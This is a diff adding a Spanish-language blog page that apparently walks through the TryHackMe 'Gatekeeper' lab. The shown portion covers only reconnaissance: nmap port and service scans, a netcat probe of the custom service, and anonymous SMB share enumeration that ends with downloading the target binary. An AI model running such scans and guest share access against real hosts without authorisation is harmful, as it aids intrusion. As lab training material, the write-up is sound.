@@ -1,0 +1,1261 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Gatekeeper [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='Buffer Overflow, Exploit Development, Hard, Immunity Debugger, Metasploit, Meterpreter, Mona, Privilege Escalation, Python, Reverse Shell, TryHackMe, Windows' />
+    
+    
+        <meta name="description" content="per es una máquina de TryHackMe que nos pide explotar una vulnerabilidad de buffer overflow en un binario de Windows sin apenas dar ninguna información sobre el objetivo ni sobre que tipo de binario puede ser. Esta sala es de dificultad &amp;ldquo;dificil&amp;rdquo; y requiere un esfuerzo adicional respecto a las anteriores para poder explotarla." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Gatekeeper [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-10-02T00:00:00Z&#43;0000' />
+    
+        
+            <meta property="article:tag" content="Buffer Overflow" />
+        
+            <meta property="article:tag" content="Exploit Development" />
+        
+            <meta property="article:tag" content="Hard" />
+        
+            <meta property="article:tag" content="Immunity Debugger" />
+        
+            <meta property="article:tag" content="Metasploit" />
+        
+            <meta property="article:tag" content="Meterpreter" />
+        
+            <meta property="article:tag" content="Mona" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="Python" />
+        
+            <meta property="article:tag" content="Reverse Shell" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="Windows" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/gatekeeper/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/gatekeeper/gatekeeper.jpeg
+        ' />
+    
+        <meta property="og:description" content="Introducción Gatekeeper es una máquina de TryHackMe que nos pide explotar una vulnerabilidad de buffer overflow en un binario de Windows sin apenas dar ninguna " />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/gatekeeper/" />
+
+
+    <meta name="twitter:title" content="Gatekeeper [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/gatekeeper/gatekeeper.jpeg
+        ' />
+    
+        <meta name="twitter:description" content="Introducción Gatekeeper es una máquina de TryHackMe que nos pide explotar una vulnerabilidad de buffer overflow en un binario de Windows sin apenas dar ninguna " />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Gatekeeper [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-10-02
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/gatekeeper/gatekeeper.jpeg" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p>Gatekeeper es una máquina de TryHackMe que nos pide explotar una vulnerabilidad de buffer overflow en un binario de Windows sin apenas dar ninguna información sobre el objetivo ni sobre que tipo de binario puede ser. Esta sala es de dificultad &ldquo;dificil&rdquo; y requiere un esfuerzo adicional respecto a las anteriores para poder explotarla. Sigue formando parte del bloque de Buffer Overflow del path &ldquo;Offensive Pentesting&rdquo; de TryHackMe, por lo que es recomendable haber completado las anteriores salas de este bloque y haber recopilado unos buenos apuntes sobre el tema antes de meterse en faena.</p>
+<h2 id="escaneo-de-puertos">Escaneo de puertos</h2>
+<p>Realizo un escaneo con nmap en dos pasos, primero un escaneo rápido para ver que puertos están abiertos y luego un escaneo completo de los puertos abiertos para obtener más información sobre los servicios que están corriendo en ellos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- -Pn -v -oN nmap_inicial 10.10.223.27
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Sun Oct  1 20:39:03 2023 as: nmap -sS --min-rate 5000 -p- -Pn -v -oN nmap_inicial 10.10.223.27</span>
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.223.27 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">88</span> out of <span style="color:#ae81ff">292</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.223.27 from <span style="color:#ae81ff">5</span> to <span style="color:#ae81ff">10</span> due to <span style="color:#ae81ff">27</span> out of <span style="color:#ae81ff">89</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.223.27 from <span style="color:#ae81ff">10</span> to <span style="color:#ae81ff">20</span> due to <span style="color:#ae81ff">32</span> out of <span style="color:#ae81ff">105</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.223.27 from <span style="color:#ae81ff">20</span> to <span style="color:#ae81ff">40</span> due to <span style="color:#ae81ff">30</span> out of <span style="color:#ae81ff">98</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.223.27 from <span style="color:#ae81ff">320</span> to <span style="color:#ae81ff">640</span> due to <span style="color:#ae81ff">34</span> out of <span style="color:#ae81ff">112</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Warning: 10.10.223.27 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.223.27
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">64219</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1305</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds
+</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server
+</span></span><span style="display:flex;"><span>31337/tcp open  Elite
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown
+</span></span><span style="display:flex;"><span>49161/tcp open  unknown
+</span></span><span style="display:flex;"><span>49167/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun Oct  1 20:39:46 2023 -- 1 IP address (1 host up) scanned in 42.43 seconds</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p135,139,445,3389,31337,49152,49153,49154,49155,49161,49167 -sC -sV -Pn -oN nmap_final 10.10.223.27
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94 scan initiated Sun Oct  1 20:39:46 2023 as: nmap -p135,139,445,3389,31337,49152,49153,49154,49155,49161,49167 -sC -sV -Pn -oN nmap_final 10.10.223.27</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.223.27
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.047s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE        VERSION
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc          Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  0^M^F   *�H��^M^A^A^A^E Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3389/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>| rdp-ntlm-info:
+</span></span><span style="display:flex;"><span>|   Target_Name: GATEKEEPER
+</span></span><span style="display:flex;"><span>|   NetBIOS_Domain_Name: GATEKEEPER
+</span></span><span style="display:flex;"><span>|   NetBIOS_Computer_Name: GATEKEEPER
+</span></span><span style="display:flex;"><span>|   DNS_Domain_Name: gatekeeper
+</span></span><span style="display:flex;"><span>|   DNS_Computer_Name: gatekeeper
+</span></span><span style="display:flex;"><span>|   Product_Version: 6.1.7601
+</span></span><span style="display:flex;"><span>|_  System_Time: 2023-10-01T18:42:24+00:00
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>gatekeeper
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-09-30T18:39:17
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-03-31T18:39:17
+</span></span><span style="display:flex;"><span>|_ssl-date: 2023-10-01T18:42:39+00:00; 0s from scanner time.
+</span></span><span style="display:flex;"><span>31337/tcp open  Elite?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest:
+</span></span><span style="display:flex;"><span>|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   GenericLines:
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   GetRequest:
+</span></span><span style="display:flex;"><span>|     Hello GET / HTTP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   HTTPOptions:
+</span></span><span style="display:flex;"><span>|     Hello OPTIONS / HTTP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   Help:
+</span></span><span style="display:flex;"><span>|     Hello HELP
+</span></span><span style="display:flex;"><span>|   Kerberos:
+</span></span><span style="display:flex;"><span>|     Hello !!!
+</span></span><span style="display:flex;"><span>|   LDAPSearchReq:
+</span></span><span style="display:flex;"><span>|     Hello <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   LPDString:
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|     default!!!
+</span></span><span style="display:flex;"><span>|   RTSPRequest:
+</span></span><span style="display:flex;"><span>|     Hello OPTIONS / RTSP/1.0
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   SIPOptions:
+</span></span><span style="display:flex;"><span>|     Hello OPTIONS sip:nm SIP/2.0
+</span></span><span style="display:flex;"><span>|     Hello Via: SIP/2.0/TCP nm;branch<span style="color:#f92672">=</span>foo
+</span></span><span style="display:flex;"><span>|     Hello From: &lt;sip:nm@nm&gt;;tag<span style="color:#f92672">=</span>root
+</span></span><span style="display:flex;"><span>|     Hello To: &lt;sip:nm2@nm2&gt;
+</span></span><span style="display:flex;"><span>|     Hello Call-ID: <span style="color:#ae81ff">50000</span>
+</span></span><span style="display:flex;"><span>|     Hello CSeq: <span style="color:#ae81ff">42</span> OPTIONS
+</span></span><span style="display:flex;"><span>|     Hello Max-Forwards: <span style="color:#ae81ff">70</span>
+</span></span><span style="display:flex;"><span>|     Hello Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Hello Contact: &lt;sip:nm@nm&gt;
+</span></span><span style="display:flex;"><span>|     Hello Accept: application/sdp
+</span></span><span style="display:flex;"><span>|     Hello
+</span></span><span style="display:flex;"><span>|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
+</span></span><span style="display:flex;"><span>|_    Hello
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc          Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc          Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc          Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc          Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49161/tcp open  msrpc          Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49167/tcp open  msrpc          Microsoft Windows RPC
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port31337-TCP:V<span style="color:#f92672">=</span>7.94%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/1%Time<span style="color:#f92672">=</span>6519BCFD%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>G
+</span></span><span style="display:flex;"><span>SF:etRequest,24,<span style="color:#e6db74">&#34;Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>SIPOptions,142,<span style="color:#e6db74">&#34;Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20&lt;sip:nm@n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:m&gt;;tag=root\r!!!\nHello\x20To:\x20&lt;sip:nm2@nm2&gt;\r!!!\nHello\x20Call-ID:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forw
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20&lt;sip:nm@nm&gt;\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHello\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,16,<span style="color:#e6db74">&#34;Hello\x20\r!!!\nHello\x20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTT
+</span></span><span style="display:flex;"><span>SF:POptions,28,<span style="color:#e6db74">&#34;Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,28,<span style="color:#e6db74">&#34;Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,F,<span style="color:#e6db74">&#34;Hello\x20HELP\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,C,<span style="color:#e6db74">&#34;Hello\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x16\x03!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,B,<span style="color:#e6db74">&#34;Hello\x20\x03!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSess
+</span></span><span style="display:flex;"><span>SF:ionReq,C,<span style="color:#e6db74">&#34;Hello\x20\x16\x03!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,A,<span style="color:#e6db74">&#34;Hello\x20!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Fou
+</span></span><span style="display:flex;"><span>SF:rOhFourRequest,47,<span style="color:#e6db74">&#34;Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2eba
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:k\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,12,<span style="color:#e6db74">&#34;Hello\x20\x01de
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:fault!!!\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,17,<span style="color:#e6db74">&#34;Hello\x200\x84!!!\nHello\x20\x01!!!\n&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:38:c9:a6:8d:ed <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2:1:0:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb-os-discovery:
+</span></span><span style="display:flex;"><span>|   OS: Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Windows <span style="color:#ae81ff">7</span> Professional 6.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+</span></span><span style="display:flex;"><span>|   Computer name: gatekeeper
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: GATEKEEPER<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>|_  System time: 2023-10-01T14:42:24-04:00
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 47m59s, deviation: 1h47m19s, median: 0s
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2023-10-01T18:42:24
+</span></span><span style="display:flex;"><span>|_  start_date: 2023-10-01T18:38:50
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Sun Oct  1 20:42:40 2023 -- 1 IP address (1 host up) scanned in 174.33 seconds</span>
+</span></span></code></pre></div><p>Llama la atención el puerto 31337 que parece estar corriendo el binario objetivo. También es llamativo el servicio SMB que está corriendo en el puerto 445. Voy a intentar obtener información sobre el servicio SMB y después comprobaré el binario que está corriendo en el puerto 31337.</p>
+<p>Pruebo el binario usando netcat y veo que se trata de un servidor que escucha en el puerto 31337 y que responde a los comandos que le envío con un &ldquo;Hello&rdquo; y el string que le he enviado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -vn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Frodo
+</span></span><span style="display:flex;"><span>Hello Frodo!!!
+</span></span><span style="display:flex;"><span>Gollum
+</span></span><span style="display:flex;"><span>Hello Gollum!!!
+</span></span></code></pre></div><h2 id="enumeración-smb">Enumeración SMB</h2>
+<p>Usando smbclicent intento obtener información sobre el servicio SMB, con el usuario guest y sin contraseña, usando las opciones -L y -N para listar los recursos compartidos y obtener información sobre el sistema operativo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbclient -L //10.10.223.27 -N
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>	---------       ----      -------
+</span></span><span style="display:flex;"><span>	ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>	C$              Disk      Default share
+</span></span><span style="display:flex;"><span>	IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>	Users           Disk      
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.223.27 failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>Tras encontrar que el recurso compartido Users existe, intento listar su contenido pero no tengo permisos para ello.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbclient --user <span style="color:#e6db74">&#34;guest&#34;</span> //10.10.223.27/Users
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\g</span>uest<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                  DR        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">15</span> 03:57:08 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                 DR        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">15</span> 03:57:08 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  Default                           DHR        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">14</span> 09:07:31 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  desktop.ini                       AHS      <span style="color:#ae81ff">174</span>  Tue Jul <span style="color:#ae81ff">14</span> 06:54:24 <span style="color:#ae81ff">2009</span>
+</span></span><span style="display:flex;"><span>  Share                               D        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">15</span> 03:58:07 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">7863807</span> blocks of size 4096. <span style="color:#ae81ff">3878843</span> blocks available
+</span></span></code></pre></div><p>Encuentro el binario que debe estar corriendo en el puerto 31337, gatekeeper.exe, y lo descargo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>hare<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">15</span> 03:58:07 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Fri May <span style="color:#ae81ff">15</span> 03:58:07 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>  gatekeeper.exe                      A    <span style="color:#ae81ff">13312</span>  Mon Apr <span style="color:#ae81ff">20</span> 07:27:17 <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">7863807</span> blocks of size 4096. <span style="color:#ae81ff">3878843</span> blocks available
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\S</span>hare<span style="color:#ae81ff">\&gt;</span> mget gatekeeper.exe 
+</span></span><span style="display:flex;"><span>Get file gatekeeper.exe? yes
